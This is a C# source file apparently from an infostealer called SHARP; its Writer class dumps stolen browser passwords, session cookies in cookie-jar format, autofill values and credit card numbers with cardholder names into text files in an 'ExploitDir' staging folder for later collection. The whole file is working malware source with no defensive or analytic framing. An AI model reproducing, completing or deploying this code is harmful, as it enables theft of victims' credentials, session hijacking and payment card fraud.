using System.IO;
using System.Threading.Tasks;

namespace SHARP
{
    internal class Writer
    {
      private static string CookiesPath = Path.Combine(Help.ExploitDir, "Cookies");
      private static string ExDir = Help.ExploitDir;
      private static string AutoFillPath = Path.Combine(Help.ExploitDir, "AutoFill");
      private static string CCDir = Path.Combine(Help.ExploitDir, "CC");

      public static async Task WritePasswords(PasswordFormat[] passwords)
      {
        using (StreamWriter passwordWriter = new StreamWriter(Path.Combine(Writer.ExDir, "Passwords.txt"), true))
        {
          PasswordFormat[] passwordFormatArray = passwords;
          for (int index = 0; index < passwordFormatArray.Length; ++index)
          {
            PasswordFormat passwordFormat = passwordFormatArray[index];
            ++Counting.Passwords;
            await passwordWriter.WriteLineAsync($"URL: {passwordFormat.Url}\nUsername: {passwordFormat.Username}\nPassword: {passwordFormat.Password}\r\n");
          }
          passwordFormatArray = (PasswordFormat[]) null;
        }
      }

      public static async Task WriteCookies(CookieFormat[] cookies, string key)
      {
        if (!Directory.Exists(Writer.CookiesPath))
          Directory.CreateDirectory(Writer.CookiesPath);
        using (StreamWriter cookieWriter = new StreamWriter(Path.Combine(Writer.CookiesPath, $"Cookies_{key}.txt")))
        {
          CookieFormat[] cookieFormatArray = cookies;
          for (int index = 0; index < cookieFormatArray.Length; ++index)
          {
            CookieFormat cookieFormat = cookieFormatArray[index];
            ++Counting.Cookies;
            await cookieWriter.WriteLineAsync($"{cookieFormat.Host}\tTRUE\t{cookieFormat.Path}\tFALSE\t{cookieFormat.Expiry}\t{cookieFormat.Name}\t{cookieFormat.Cookie}\r\n");
          }
          cookieFormatArray = (CookieFormat[]) null;
        }
      }

      public static async Task WriteAutoFill(AutoFilesFormat[] autofilles, string key)
      {
        if (!Directory.Exists(Writer.AutoFillPath))
          Directory.CreateDirectory(Writer.AutoFillPath);
        using (StreamWriter cookieWriter = new StreamWriter(Path.Combine(Writer.AutoFillPath, $"AutoFill_{key}.txt")))
        {
          AutoFilesFormat[] autoFilesFormatArray = autofilles;
          for (int index = 0; index < autoFilesFormatArray.Length; ++index)
          {
            AutoFilesFormat autoFilesFormat = autoFilesFormatArray[index];
            ++Counting.AutoFill;
            await cookieWriter.WriteLineAsync($"Name: {autoFilesFormat.Key}\nValue: {autoFilesFormat.Value}\r\n");
          }
          autoFilesFormatArray = (AutoFilesFormat[]) null;
        }
      }

      public static async Task WriteCreditCards(CreditCardFormat[] creditcards, string key)
      {
        if (!Directory.Exists(Writer.CCDir))
          Directory.CreateDirectory(Writer.CCDir);
        using (StreamWriter cardWriter = new StreamWriter(Path.Combine(Writer.CCDir, $"CreditCards_{key}.txt")))
        {
          CreditCardFormat[] creditCardFormatArray = creditcards;
          for (int index = 0; index < creditCardFormatArray.Length; ++index)
          {
            CreditCardFormat creditCardFormat = creditCardFormatArray[index];
            ++Counting.cc;
            await cardWriter.WriteLineAsync($"Number: {creditCardFormat.Number}\nExpYear: {creditCardFormat.ExpYear}\nExpMonth: {creditCardFormat.ExpMonth}\nName: {creditCardFormat.Name}\r\n");
          }
          creditCardFormatArray = (CreditCardFormat[]) null;
        }
      }
    }
}
